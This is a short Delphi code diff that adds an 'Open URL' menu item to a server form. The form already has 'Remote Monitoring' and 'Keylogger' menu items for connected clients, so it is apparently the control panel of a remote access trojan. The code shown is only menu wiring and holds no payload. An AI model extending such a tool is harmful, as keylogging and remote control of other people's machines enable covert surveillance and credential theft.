@@ -82,6 +82,7 @@ type
     procedure AddOrUpdateListView(const Info: TClientInfo);
     procedure RemoveFromListView(aLine: TncLine);
     procedure UpdateStatusBar;
+    procedure EnsureOpenURLMenuItem;
   public
     procedure AfterConstruction; override;
     procedure BeforeDestruction; override;
@@ -117,6 +118,7 @@ begin
 
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
+  EnsureOpenURLMenuItem;
   ListView1.OnMouseDown := ListView1MouseDown;
 end;
 
@@ -240,6 +242,21 @@ begin
   end;
 
   Keylogger1.OnClick := Keylogger1Click;
+end;
+
+procedure TForm1.EnsureOpenURLMenuItem;
+begin
+  if not Assigned(PopupMenu1) then
+    Exit;
+
+  if not Assigned(OpenURL1) then
+  begin
+    OpenURL1         := TMenuItem.Create(PopupMenu1);
+    OpenURL1.Caption := 'Open URL';
+    PopupMenu1.Items.Add(OpenURL1);
+  end;
+
+  OpenURL1.OnClick := OpenURL1Click;
 end;
 
 // ---- Server Initialization ----
